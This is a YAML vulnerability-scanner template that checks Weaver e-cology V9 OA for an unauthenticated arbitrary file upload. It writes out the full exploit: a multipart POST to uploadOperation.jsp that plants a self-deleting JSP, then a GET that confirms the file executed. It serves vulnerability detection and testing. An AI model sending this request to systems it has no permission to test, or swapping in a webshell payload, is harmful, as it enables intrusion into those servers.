expression: r0() && r1()
id: e-cology-arbitrary-file-upload
info:
  author: jingling(https://github.com/shmilylty)
  description: "\u6CDB\u5FAEOA ecology V9\u524D\u53F0\u4EFB\u610F\u4E0A\u4F20\u6F0F\
    \u6D1E app=\"Weaver-OA\""
  name: "\u6CDB\u5FAEOA e-cology V9\u524D\u53F0\u4EFB\u610F\u4E0A\u4F20\u6F0F\u6D1E"
  reference:
  - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
  severity: critical
rules:
  r0:
    expression: response.status == 200
    request:
      body: "--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
        \ name=\"file\"; filename=\"{{r1}}.jsp\"\r\nContent-Type: application/octet-stream\r\
        \n\r\n<%out.print({{r2}} * {{r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\
        \n--WebKitFormBoundary{{rboundary}}--\r\n"
      headers:
        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
      method: POST
      path: /page/exportImport/uploadOperation.jsp
  r1:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r2
      * r3)))
    request:
      method: GET
      path: /page/exportImport/fileTransfer/{{r1}}.jsp
set:
  r1: randomLowercase(4)
  r2: randomInt(40000, 44800)
  r3: randomInt(40000, 44800)
  rboundary: randomLowercase(8)
